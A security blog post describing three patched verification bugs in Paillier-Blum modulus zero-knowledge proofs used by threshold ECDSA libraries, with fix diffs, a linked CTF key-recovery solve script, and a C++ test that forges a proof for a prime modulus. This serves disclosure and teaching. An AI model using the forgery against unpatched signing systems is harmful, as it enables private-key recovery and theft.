# Soundness violations in popular zero knowledge proof libraries

I've been thinking quite a bit about ECDSA threshold signatures over the past
two years, which means I have also been spending a lot of time inspecting
[Paillier-Blum modulus
proofs](https://www.zkdocs.com/docs/zkdocs/zero-knowledge-protocols/product-primes/paillier_blum_modulus/).
These proofs form a critical component of Paillier based threshold signature
protocols, particularly those derived from the
[GG18](https://eprint.iacr.org/2019/114)-[GG20](https://eprint.iacr.org/2020/540)
family, such as [CMP20](https://eprint.iacr.org/2020/492) and
[CGGMP21](https://eprint.iacr.org/2021/060).

The text of the proof goes something like this, following the exposition of
CMP20 Section 4.3:

**Inputs**: Common input is $N$. Prover has secret input $(p, q)$ such that $N = pq$.

1. Prover samples a random $w \leftarrow \mathbb{Z}_N$ of Jacobi symbol $-1$ and sends it to the verifier.

2. Verifier sends $\{y_i \leftarrow \mathbb{Z}_N\}_{i \in [m]}$

3. For every $i \in [m]$ set:
    - $x = \sqrt[4]{y_i} \mod N$, where $y_i' = (-1)^a w^b y_i$ for unique $a_i, b_i \in \{0, 1\}$ such that $x_i$ is well defined.
    - $z_i = \{y_i^{N^{-1} \mod \phi(N)}\} \mod N$

4. Send $\{(x_i, a_i, b_i), z_i\}_{i \in [m]}$ to the Verifier.
  
**Verification**: Accept iff all of the following hold:
  - $N$ is an odd composite number.
  - $z_i^{N} = y_i \mod N$ for every $i \in [m]$.
  - $x_i^{4} = (-1)^{a_i} w^{b_i} y_i \mod N$ and $a_i, b_i \in \{0, 1\}$ for every $i \in [m]$.

A crucial step is that the Verifier must check that $w$ has Jacobi symbol $-1$.
When following CMP20's exposition, it is easy to miss this step since the
property is only mentioned in Step 1, but is missing from final list of
verifications. This can lead to soundness violations in the Paillier-Blum proof,
which when used in the context of threshold signature protocols such as CMP20,
can lead to full private key recovery in as few as 16 signatures.

In this article, we describe three vulnerabilities in popular ZKP libraries
which were in the folklore but have now been patched. As far as I can tell, only
the `paillier-zk` bug has an official advisory attached, so these are still
worth watching out for in case you are using or auditing an implementation which
depends on a vulnerable version.


#### Bug 1: Missing $w$ verification in Fireblocks `mpc-lib`

Since CMP20 was originally developed by Fireblocks, the [`mpc-lib`](https://github.com/fireblocks/mpc-lib) repo can in some ways be
regarded as the "reference implementation" of the protocol.
However prior to commit
[`84b7fb8`](https://github.com/fireblocks/mpc-lib/commit/84b7fb83502a998703b6ceb113273fc20fa55b7b),
the Paillier-Blum modulus proof did not verify that $w$ and $N$ were coprime, which is necessary for $w$ to have Jacobi symbol $-1$.

```diff
diff --git a/src/common/crypto/paillier/paillier_zkp.c b/src/common/crypto/paillier/paillier_zkp.c
index 65d666a..4eadaf0 100644
--- a/src/common/crypto/paillier/paillier_zkp.c
+++ b/src/common/crypto/paillier/paillier_zkp.c
@@ -953,6 +953,11 @@ long paillier_verify_paillier_blum_zkp(const paillier_public_key_t *pub, const u
     if (!y || !tmp)
         goto cleanup;
 
+    if (!is_coprime_fast(proof.w, pub->n, ctx))
+    {
+        ret = PAILLIER_ERROR_INVALID_PROOF;
+        goto cleanup;
+    }
     for (uint32_t i = 0; i < PAILLIER_BLUM_STATISTICAL_SECURITY; ++i)
     {
         do
@@ -960,6 +965,11 @@ long paillier_verify_paillier_blum_zkp(const paillier_public_key_t *pub, const u
             deterministic_rand(seed, n_len, y, &seed);
         } while (BN_cmp(y, pub->n) >= 0);
         
+        if (!is_coprime_fast(y, pub->n, ctx))
+        {
+            ret = PAILLIER_ERROR_INVALID_PROOF;
+            goto cleanup;
+        }
         if (!BN_mod_exp(tmp, proof.z[i], pub->n, pub->n, ctx))
             goto cleanup;
         if (BN_cmp(tmp, y) != 0)
```

Without this check, the protocol becomes vulnerable to a key recovery attack
similar to the attack of
[CVE-2023-33241](https://www.cve.org/CVERecord?id=CVE-2023-33241) on GG18/GG20.
This missing coprimality check was the subject of my 2025 DownUnderCTF challenge
`good-game-well-played`, the solve script for which can be found [here](https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/crypto/good_game_well_played/solve). The script implements a modified version of the CVE-2023-33241 attack, adapted for the CMP20 protcol. 

#### Bug 2: Missing $w$ verification in LFDT `paillier-zk` crate

In a similar manner, the `paillier-zk` crate prior to commit
[`9a7d2fe`](https://github.com/LFDT-Lockness/paillier-zk/commit/9a7d2fea8b7d4eb0d35cd797e2d607bda20c19c4)
does not verify that $w$ has Jacobi symbol $-1$. Hence a proof can be easily forged by choosing the commitment $w = 0$.

```diff
diff --git a/src/paillier_blum_modulus.rs b/src/paillier_blum_modulus.rs
index fcf60fe..784be60 100644
--- a/src/paillier_blum_modulus.rs
+++ b/src/paillier_blum_modulus.rs
@@ -123,7 +123,10 @@ pub mod interactive {
     use rand_core::RngCore;
     use rug::{Complete, Integer};
 
-    use crate::common::sqrt::{blum_sqrt, find_residue, sample_neg_jacobi};
+    use crate::common::{
+        fail_if_ne,
+        sqrt::{blum_sqrt, find_residue, sample_neg_jacobi},
+    };
     use crate::{BadExponent, Error, ErrorReason, InvalidProof, InvalidProofReason};
 
     use super::{Challenge, Commitment, Data, PrivateData, Proof, ProofPoint};
@@ -179,6 +182,11 @@ pub mod interactive {
         if data.n.is_even() {
             return Err(InvalidProofReason::ModulusIsEven.into());
         }
+        fail_if_ne(
+            InvalidProofReason::EqualityCheck(1),
+            &data.n.gcd_ref(&commitment.w).complete(),
+            Integer::ONE,
+        )?;
         for (point, y) in proof.points.iter().zip(challenge.ys.iter()) {
             if Integer::from(
                 point
```

As an aside, when this bug was patched the changelog placed the blame partly on
the CGGMP21 paper for omitting the coprimality check between $w$ and $N$,
stating:

```
[!WARNING]
This library version uses Zero-Knowledge proofs from the CGGMP21 paper, 
which contains a critical vulnerability that could lead to full private 
key recovery.
```

However, if one takes a charitable view, one could also argue that coprimality
between $w$ and $N$ was already implied when $w$ was stated to have Jacobi
symbol $-1$, for if $w$ and $N$ shared non-trivial factors then the Jacobi
symbol would be $0$.

#### Bug 3: Missing primality and coprimality check in Safeheron Crypto Suites 

The Safeheron Crypto Suites are a self-described foundational cryptographic
library, developed by Safeheron. Included within is a module for Paillier-Blum
modulus proofs, which prior to commit
[`36f0a0f`](https://github.com/Safeheron/safeheron-crypto-suites-cpp/commit/36f0a0ff352e9f23080bf1de448581deb3d61485)
did not verify that $w$ and $N$ were coprime, nor that $N$ itself was composite.
However, the verification logic _did_ verify that $0 < w < N$. The left two
possible methods to forge a proof:

1. Supply $N$ prime and try to prove that a prime is a Paillier-Blum modulus
2. Supply for $w$ a factor (or product of factors) of $N$ and attempt to forge a proof for non-biprime $N$.

By CRT, the latter case reduces naturally to the former, since if $N =
\prod_{i}p_i$ and we choose $w = \prod_{i \neq j} p_i$, then $w \equiv 0 \mod
p_i$ whenever $i \neq j$. Hence the proof is trivial in all factors besides
$p_j$, which is equivalent to the first case.

To attack the first case, we observe that the Paillier-Blum modulus proof
consists primarily of two halves. The first half is proving that
$\mathbb{Z}/N\mathbb{Z}$ has $N$-th roots, which is equivalent to showing that
$\mathrm{gcd}(N, \phi(N)) = 1$. Since this is automatically true for prime $N$,
we can proceed according to protocol in this case.

The second case involves showing that $N$ contains at most two factors. Given a
challenge $y_i$, the prover must show that one of $y_i, -y_i, wy_i, -wy_i$ has
Legendre symbol $1$ in each factor, which is necessary for being a quadratic
residue in $\mathbb{Z}/N\mathbb{Z}$. This is done by giving the Prover control
over two binary switches which respectively control the parity of the Legendre
symbol in certain subsets of factors of $N$. By choosing to multiply by $-1$,
the Prover can invert the parity in every factor. By choosing to multiply by
$w$, the Prover can invert the parity of the Legendre symbol in an odd number of
factors. Hence, if $N$ is square-free and has more than two factors then the
Prover can succeed with probability at most $1/2$. On the other hand if $N$ has
less than two factors, then the Prover can always succeed. In particular, a
valid proof can always be constructed when $N$ is prime, as shown below:
```cpp
// soundness violation #1: we prove that a prime p is a Paillier-Blum Modulus
TEST(ZKP, PailBlumModulusProofPrime)
{
    std::string P_hex = "a57a9a469c1019907d35f3bb798e4b99c23609cf963d68e7f5727e6a7dabe5c85c8beaf292813c461cb0245ad294aa31d5284eb6d2b16f6cc81d4ebc0d939fa46e4d92c4a506206b72de28a5e333208bf0fb90c1f0231fee6f13ed323736706711fa5708dc7d68298a3ca4e30c3fee3db65e85f10e16332abcface9eb7b4fa7e2b9d32914a3aac48d8a98001461925b7aae886499538b833ba705cd934126cf9c038bdc41b9939a1dfd9e9ef9aa3e992e6662c5ef85b8c9e71ffe7d41841eefbaa9ac8943ac3cddfddd82bfd502a90a92db1916eadba25fd4e2c64d9038c029487b99d5433a8d01708b55fad4e5cc552d5af97a6d9adefabdb440f17dd82727f";
    BN P = BN::FromHexStr(P_hex);
    safeheron::zkp::pail::PailBlumModulusProof proof;

    // commit -> chose any w with jacobi symbol -1
    proof.w_ = RandomBNLt(P);
    while (BN::JacobiSymbol(proof.w_, P) != -1){
        proof.w_ = RandomBNLt(P);
    }

    ASSERT_TRUE(BN::JacobiSymbol(BN(6), BN(9)) == 0);
    std::vector<int> prime_arr;
    prime_util(6000, prime_arr);
    ASSERT_TRUE(prime_arr.at(0) == 2);

    // challenge
    std::vector<BN> y_arr;
    proof.GenerateYs(y_arr, P, proof.w_, ITERATIONS_BlumInt_Proof );

    // reveal
    for(int i = 0; i < ITERATIONS_BlumInt_Proof; ++i) {
        // by fermat's little theorem -> y^p = y mod p
        BN z = y_arr[i];

        int32_t a, b;           // a controls -1, b controls w
        if (BN::JacobiSymbol(y_arr[i], P) == 1) {
            // y is a quadratic residue mod p
            // since p = 3 mod 4, by biquadratic reciprocity, y is also a quartic residue mod p
            a = b = 0;
        } else {
            // -1 is always quadratic non residue
            a = 1;
            b = 0;
        }

        // we are guaranteed that (-1)^a * y is a quadratic residue.
        BN root = (a ? y_arr[i].Neg() : y_arr[i]) % P;
        root = root.SqrtM(P);
        // if sqrt(a * y) is again a quadratic residue, then
        // sqrt(sqrt(a * y))^4 = y
        if (BN::JacobiSymbol(root, P) == 1) {
            root = root.SqrtM(P);
        } else {
            // otherwise -sqrt(a*y) is a quadratic residue,
            // so sqrt(-sqrt(a * y)) is a quartic residue
            root = (root.Neg() % P).SqrtM(P);
        }

        proof.x_arr_.push_back(root);
        proof.z_arr_.push_back(z);
        proof.a_arr_.push_back(a);
        proof.b_arr_.push_back(b);
    }

    // verify
    ASSERT_TRUE(proof.Verify(P));
}
```



